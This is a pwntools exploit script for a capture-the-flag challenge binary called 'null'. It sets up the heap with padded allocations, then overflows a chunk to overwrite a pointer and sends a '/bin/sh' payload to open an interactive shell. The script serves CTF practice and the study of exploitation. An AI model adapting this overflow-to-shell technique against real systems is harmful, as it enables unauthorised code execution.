#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

__author__ = "luckasdf0"

from pwn import *
import time

# Settings
context.terminal = ['tmux', 'splitw', '-h']

#io = remote("47.75.57.242", 5000)
#io = process("./null", env = {"LD_PRELOAD" : "./libc.so.6"})
io = process("./binary/null")

# gdb
def attach(addr):
    gdb.attach(io, execute='b *0x%x' % (addr))

def use(size, blocks, payload, inp):
    io.recvuntil('Action')
    io.sendline('1')
    io.recvuntil('Size:')
    io.sendline(str(size))
    io.recvuntil('Pad blocks:')
    io.sendline(str(blocks))
    io.recvuntil('Content? (0/1):')
    if inp:
        io.sendline('1')
        io.recvuntil('Input:')
        io.sendline(payload)
    else:
        io.sendline('0')

#io.recvuntil('Enter secret password: ')
#io.sendline("i'm ready for challenge\n")

for i in xrange(11):
    print i
    use(0x4000, 1000, 'A'*0x3fff, True)

use(0x4000, 999, 'A'*0x3fff, True)
use(0x3f80, 0, 'A'*0x3f7f, True)

use(0xff0, 1000, '', False)

use(0xff0, 52, '', False)
use(0x660, 0x0, 'A'*0x65f, True)
use(0x100, 0x0, 'A'*0xff, True)

attach(0x400DBD)

io.recvuntil('Action')
io.sendline('1')
io.recvuntil('Size:')
io.sendline(str(0xe0))
io.recvuntil('Pad blocks:')
io.sendline(str(0x0))
io.recvuntil('Content? (0/1):')
io.sendline(str(1))
io.recvuntil('Input:')
io.send('1'*0xdf)
time.sleep(0x3)
io.send('1'*0x1 + 'A'*0x40 + p64(0x0000000300000000) + p64(0x0)*0x5 + p64(0x601ff5))

payload = '/bin/sh'.ljust(0x33, '\0')+p64(0x400978)

attach(0x400CF2)
use(0x60, 0, payload.ljust(0x60), True)

io.interactive()
